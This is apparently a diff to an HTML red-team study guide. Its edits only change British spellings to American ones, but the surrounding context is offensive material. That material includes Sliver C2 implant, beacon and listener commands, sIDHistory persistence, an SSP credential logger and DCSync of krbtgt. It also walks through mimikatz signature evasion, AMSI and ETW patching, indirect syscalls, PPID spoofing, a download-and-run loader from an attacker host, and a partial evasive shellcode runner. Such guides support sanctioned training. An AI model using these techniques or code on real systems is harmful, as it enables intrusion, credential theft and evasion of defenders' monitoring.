 <p>Persistence variant: patch the sIDHistory attribute on a low-privileged domain account directly with DSInternals so the account behaves like a Domain Admin at every subsequent logon.</p>
 <pre><code class="language-powershell"># Stop the NTDS service before the patch
@@ -3232,9 +3232,9 @@ mtls --lport 8888</code></pre>
 <p>DNS is slow (each request encodes a small chunk of C2 traffic in the subdomain) but survives environments where HTTP egress is fully blocked. Delegate the cover subdomain via an NS record on the public DNS before the listener will resolve.</p>
 
 <h3 id="cape-sliver-implants-and-stagers">12.2.1 Implants vs Beacons vs Stagers</h3>
-<p>Three artefact types serve different purposes:</p>
+<p>Three artifact types serve different purposes:</p>
 <table class="custom-table">
-<thead><tr><th>Type</th><th>Behaviour</th><th>When to reach for it</th></tr></thead>
+<thead><tr><th>Type</th><th>Behavior</th><th>When to reach for it</th></tr></thead>
 <tbody>
 <tr><td>Session implant</td><td>Interactive, full-featured payload. Every command runs immediately over the transport.</td><td>Hands-on-keyboard work when the transport is stable and detection risk is acceptable.</td></tr>
 <tr><td>Beacon</td><td>Polls the C2 on a configurable interval and jitter, runs queued commands, then sleeps.</td><td>Long-haul access on monitored networks. Sleep and jitter blend into normal user activity.</td></tr>
@@ -3249,13 +3249,13 @@ profiles new --http &lt;attacker-fqdn&gt; --format shellcode &lt;profile-name&gt
 stage-listener --url tcp://0.0.0.0:8443 --profile &lt;profile-name&gt;</code></pre>
 
 <h3 id="cape-sliver-sideload">12.2.2 Sideload and Canary Domains</h3>
-<p><code>sideload</code> loads an arbitrary DLL into the beacon process and calls one of its exports, which is how you run tools that ship as DLLs (mimikatz variants, some BOF-style loaders). <code>canary</code> injects unique domain names into an implant that will phone home if the implant is analysed in a sandbox with unrestricted DNS.</p>
+<p><code>sideload</code> loads an arbitrary DLL into the beacon process and calls one of its exports, which is how you run tools that ship as DLLs (mimikatz variants, some BOF-style loaders). <code>canary</code> injects unique domain names into an implant that will phone home if the implant is analyzed in a sandbox with unrestricted DNS.</p>
 <pre><code class="language-bash"># Sideload a DLL and call an export
 sideload &lt;path-to-loader.dll&gt; --entry-point ExecuteCmd --args '&lt;cmd&gt;'
 
 # Add a canary domain during implant generation
 generate --http &lt;attacker-fqdn&gt; --canary canary-&lt;random&gt;.&lt;attacker-domain.com&gt; --save &lt;save-path&gt;
-# Any DNS resolution of that canary tells you the implant has been analysed</code></pre>
+# Any DNS resolution of that canary tells you the implant has been analyzed</code></pre>
 
 <h3 id="cape-sliver-implants">12.3 Generating Implants</h3>
 <p>Sliver supports HTTP, HTTPS, DNS, and mTLS listeners. HTTP on the default port:</p>
@@ -3376,7 +3376,7 @@ Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security P
 <p>Subsequent logon credentials get logged to <code>C:\Windows\System32\kiwissp.log</code>.</p>
 
 <h3 id="cape-sliver-bofs">12.10 Beacon Object Files (BOFs)</h3>
-<p>Sliver runs BOFs compiled for its own COFF loader. A BOF is a small C program compiled to an object file that runs inside the implant process without spawning a new process. That keeps post-exploitation activity inside a single memory space and avoids the parent-child chains that behavioural sensors look for.</p>
+<p>Sliver runs BOFs compiled for its own COFF loader. A BOF is a small C program compiled to an object file that runs inside the implant process without spawning a new process. That keeps post-exploitation activity inside a single memory space and avoids the parent-child chains that behavioral sensors look for.</p>
 <pre><code class="language-bash"># Load and run a BOF against the active session
 coff-loader &lt;path-to-bof.o&gt; &lt;args&gt;
 
@@ -3407,7 +3407,7 @@ armory install situational-awareness-bof
 armory refresh</code></pre>
 
 <h3 id="cape-sliver-wireguard">12.13 WireGuard Listener</h3>
-<p>Sliver ships a WireGuard transport as an alternative to HTTP(S) or mTLS. WireGuard runs over UDP with strong cryptography built in, and its traffic looks like generic UDP rather than a recognisable C2 pattern. Useful when the target segment tolerates outbound UDP but blocks TCP tunnels.</p>
+<p>Sliver ships a WireGuard transport as an alternative to HTTP(S) or mTLS. WireGuard runs over UDP with strong cryptography built in, and its traffic looks like generic UDP rather than a recognizable C2 pattern. Useful when the target segment tolerates outbound UDP but blocks TCP tunnels.</p>
 <pre><code class="language-bash"># Start a WireGuard listener
 wg --lport 53 --nport 8888 --keylport 1337
 
@@ -3460,7 +3460,7 @@ execute-assembly SharpKatz.exe --Command dcsync --User krbtgt --Domain <domain.l
 <li><input type="checkbox" data-id="cape-sliver-methodology-wf-7"> Rotate C2 channels and rebuild implants regularly during long engagements.</li>
 </ul>
 <h2 id="cape-evasion-13">13. Introduction to Windows Evasion Techniques</h2>
-<p>Modern Windows presents an evasion problem in three layers: static signature detection on artefacts, runtime scanning as code executes, and application whitelisting deciding what gets to run at all. Getting past each layer means understanding what triggers the detection and either changing what the sensor sees, or moving execution to a code path the sensor does not inspect. The techniques in this section are the primitives, not the payloads; combining them properly is what makes the difference between a burnt tool and a landed implant.</p>
+<p>Modern Windows presents an evasion problem in three layers: static signature detection on artifacts, runtime scanning as code executes, and application whitelisting deciding what gets to run at all. Getting past each layer means understanding what triggers the detection and either changing what the sensor sees, or moving execution to a code path the sensor does not inspect. The techniques in this section are the primitives, not the payloads; combining them properly is what makes the difference between a burnt tool and a landed implant.</p>
 <p style="text-align:center;"><img src="./img/cape/windows-defender-ui.png" alt="Windows Defender UI showing real-time protection settings" style="max-width:75%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-evasion-av-signature">13.1 How Signature-Based Detection Works</h3>
@@ -3591,7 +3591,7 @@ Find-AVSignature -StartByte 0 -EndByte max -Interval 100 -Path mimikatz.exe -Out
 <p>In observed order of frequency, Defender's Mimikatz signatures fire on:</p>
 <ul>
 <li><code>.rdata</code> string literals, banner text and error messages (fixed by string substitution).</li>
-<li>Import Address Table entries like <code>I_NetServerPasswordGet</code> and its neighbours (fixed by ordinal loading).</li>
+<li>Import Address Table entries like <code>I_NetServerPasswordGet</code> and its neighbors (fixed by ordinal loading).</li>
 <li>Version resource: CompanyName, ProductName, OriginalFilename (fixed by rewriting the Windows metadata block).</li>
 <li>Occasional <code>.text</code> byte patterns from specific routines, usually the <code>sekurlsa_msv</code> logic.</li>
 </ul>
@@ -3605,7 +3605,7 @@ Find-AVSignature -StartByte 0 -EndByte max -Interval 100 -Path mimikatz.exe -Out
 <li>In VS, right-click the solution → <em>Rebuild Solution</em> so intermediate <code>.obj</code> and <code>.pdb</code> files are regenerated.</li>
 <li>Copy <code>x64\Release\mimikatz.exe</code> to an isolated Defender-enabled test VM (never the dev VM).</li>
 <li>Run the binary and record the exact signature name Defender reports (Event Viewer → <em>Microsoft-Windows-Windows Defender/Operational</em>, event ID 1116).</li>
-<li>Signature-name suffixes point at the detection type: <code>!MTB</code> = machine-learning behaviour, <code>.A</code>/<code>.B</code> = definition-based string / byte pattern, <code>!ml</code> = cloud-side ML rule.</li>
+<li>Signature-name suffixes point at the detection type: <code>!MTB</code> = machine-learning behavior, <code>.A</code>/<code>.B</code> = definition-based string / byte pattern, <code>!ml</code> = cloud-side ML rule.</li>
 <li>Rerun DefenderCheck to confirm the change, then move to the next signature.</li>
 </ul>
 
@@ -3642,7 +3642,7 @@ End Sub</code></pre>
 <h3 id="cape-evasion-runtime">13.7 Runtime Evasion</h3>
 
 <h4 id="cape-evasion-runtime-def">13.7.1 Definition of Runtime Detection</h4>
-<p>Runtime detection scans code before execution and classifies it based on strings, heuristics, or behaviour. If assessed as malicious, execution is halted and the artefact may be quarantined. Runtime scanners read from memory and observe API calls, unlike static AV, which reads from disk.</p>
+<p>Runtime detection scans code before execution and classifies it based on strings, heuristics, or behavior. If assessed as malicious, execution is halted and the artifact may be quarantined. Runtime scanners read from memory and observe API calls, unlike static AV, which reads from disk.</p>
 <p>Windows ships AMSI as its native runtime detection stream. AV products often consume AMSI events as part of their heuristics.</p>
 
 <h4 id="cape-evasion-amsi">13.7.2 AMSI</h4>
@@ -3719,7 +3719,7 @@ NtAllocateVirtualMemory PROC
     mov eax, 18h                            ; SSN
     jmp QWORD PTR [ntAllocSyscallAddr]      ; jump to ntdll's own syscall;ret gadget
 NtAllocateVirtualMemory ENDP</code></pre>
-<p>Two runtime problems: SSNs change between Windows builds, and the target ntdll may already be hooked. Hell's Gate resolves SSNs by walking ntdll's Export Address Table and reading them from the function prologue (the <code>mov eax, imm32</code> immediate). Halo's Gate is the fallback when the prologue is hooked: pick a neighbour that is not hooked and add or subtract the offset, since SSNs are sequential.</p>
+<p>Two runtime problems: SSNs change between Windows builds, and the target ntdll may already be hooked. Hell's Gate resolves SSNs by walking ntdll's Export Address Table and reading them from the function prologue (the <code>mov eax, imm32</code> immediate). Halo's Gate is the fallback when the prologue is hooked: pick a neighbor that is not hooked and add or subtract the offset, since SSNs are sequential.</p>
 
 <h3 id="cape-evasion-etw">13.11 ETW Patching</h3>
 <p>Event Tracing for Windows (ETW) is what feeds a lot of the runtime telemetry EDRs consume, including managed .NET events like assembly loads and PowerShell scriptblock execution. Two lightweight patches disable ETW inside the current process.</p>
@@ -3768,7 +3768,7 @@ auto VA = (pVirtualAlloc)resolve(GetModuleHandle("kernel32.dll"), 0x91AFCA54);
 VA(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</code></pre>
 
 <h3 id="cape-evasion-pid-cmdline">13.14 Parent PID and Command-Line Spoofing</h3>
-<p>Two Windows process attributes drive a lot of behavioural detections: the parent process ID and the command line. Both can be spoofed at process-creation time using the extended <code>STARTUPINFOEX</code> structure and the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute. The effect on the sensor is that a payload launched from a macro appears to have <code>explorer.exe</code> as its parent, and the command line recorded in ETW is the decoy the attacker supplied instead of the real one.</p>
+<p>Two Windows process attributes drive a lot of behavioral detections: the parent process ID and the command line. Both can be spoofed at process-creation time using the extended <code>STARTUPINFOEX</code> structure and the <code>PROC_THREAD_ATTRIBUTE_PARENT_PROCESS</code> attribute. The effect on the sensor is that a payload launched from a macro appears to have <code>explorer.exe</code> as its parent, and the command line recorded in ETW is the decoy the attacker supplied instead of the real one.</p>
 <pre><code class="language-c">STARTUPINFOEX si = {0};
 si.StartupInfo.cb = sizeof(STARTUPINFOEX);
 
@@ -3802,7 +3802,7 @@ Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled
 $bytes[1111] = 0
 [System.IO.File]::WriteAllBytes("mal_mod.exe", $bytes)</code></pre>
 </li>
-<li><input type="checkbox" data-id="cape-evasion-methodology-wf-3"> Prefer in-memory PowerShell loaders, reduces on-disk artefacts.
+<li><input type="checkbox" data-id="cape-evasion-methodology-wf-3"> Prefer in-memory PowerShell loaders, reduces on-disk artifacts.
 <pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString('http://&lt;attacker&gt;/loader.ps1')</code></pre>
 </li>
 <li><input type="checkbox" data-id="cape-evasion-methodology-wf-4"> Disable or bypass AMSI early in a PowerShell session.
@@ -3821,7 +3821,7 @@ End Sub</code></pre>
 </ul>
 
 <h4 id="cape-evasion-methodology-runner">13.15.1 Combined Shellcode Runner</h4>
-<p>A production runner chains the individual primitives together. The sketch below pulls compile-time API hashing, ETW patching, Halo's Gate SSN resolution, indirect syscalls, a sandbox sleep gate, an XOR-encrypted payload, and parent-PID plus command-line spoofing into a single program. Each block is labelled with what it does so the runner can be reshuffled or trimmed per engagement.</p>
+<p>A production runner chains the individual primitives together. The sketch below pulls compile-time API hashing, ETW patching, Halo's Gate SSN resolution, indirect syscalls, a sandbox sleep gate, an XOR-encrypted payload, and parent-PID plus command-line spoofing into a single program. Each block is labeled with what it does so the runner can be reshuffled or trimmed per engagement.</p>
 <pre><code class="language-c">#include &lt;windows.h&gt;
 #include &lt;winternl.h&gt;
 
@@ -3866,13 +3866,13 @@ void patch_etw(void) {
     VirtualProtect(p, 1, old, &amp;old);
 }
 
-/* --- Halo's Gate: read SSN or infer from neighbour ------ */
+/* --- Halo's Gate: read SSN or infer from neighbor ------ */
 DWORD ssn(HMODULE ntdll, DWORD target_hash) {
     BYTE* fn = (BYTE*)resolve(ntdll, target_hash);
     /* clean prologue is: 4C 8B D1  B8 xx xx xx xx  (mov r10,rcx ; mov eax,ssn) */
     if (fn[0]==0x4C &amp;&amp; fn[1]==0x8B &amp;&amp; fn[2]==0xD1 &amp;&amp; fn[3]==0xB8)
         return *(DWORD*)(fn + 4);
-    /* hooked: walk neighbours 0x20 bytes apart until a clean prologue is found */
+    /* hooked: walk neighbors 0x20 bytes apart until a clean prologue is found */
     for (int i = 1; i &lt; 500; i++) {
         BYTE* up   = fn + (i * 0x20);
         BYTE* down = fn - (i * 0x20);
